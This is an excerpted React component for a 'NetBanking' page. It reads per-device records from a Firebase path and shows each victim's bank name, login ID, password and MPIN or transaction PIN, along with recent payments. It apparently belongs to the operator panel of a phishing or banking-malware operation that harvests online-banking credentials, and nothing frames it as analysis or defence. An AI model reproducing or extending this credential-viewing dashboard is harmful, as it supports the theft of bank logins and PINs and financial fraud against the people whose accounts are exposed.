...
function NetBankingPage() {
  ...
  const fetchData = async () => {
    ...
    setError(null);
    try {
      // ✅ FIXED: "netbank_payment" (singular) - CORRECT PATH
      const netbankRef = ref(db, `netbanking_payment/${deviceId}`);
      const snap = await get(netbankRef);
  ...
  if (error) {
    return (
      <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
        ...
        <p style={{ fontSize: '13px' }}>Failed to load netbanking data</p>
  ...
  if (!data) {
    return (
      <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
        <span style={{ fontSize: '32px', display: 'block', marginBottom: '4px' }}>📭</span>
        <p style={{ fontSize: '13px' }}>No net banking data found</p>
      </div>
    );
  }
    ...
    <div style={{ padding: '4px 0' }}>
      ...
      <div style={{ 
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '11px', color: 'var(--text-muted)', fontWeight: 500 }}>🏦 Bank Name</span>
          <span style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.bankName || data.bank || 'N/A'}
          </span>
        </div>
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>👤 Login ID</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.loginId || data.userId || 'N/A'}
          </span>
        </div>
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🔐 Password</span>
        ...
        <div style={{ 
          ...
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🔑 MPIN</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: '#e74c3c', fontFamily: 'monospace', letterSpacing: '2px' }}>
            {data.mpin || data.trxPin || data.txnPin || 'N/A'}
          </span>
        </div>
          ...
          {allPayments.slice(0, 5).map((payment, index) => (
            <div key={payment.id || index} style={{ 
              ...
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                ...
                <div>
                  <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                    {payment.bankName || payment.bank || 'N/A'}
                  </span>
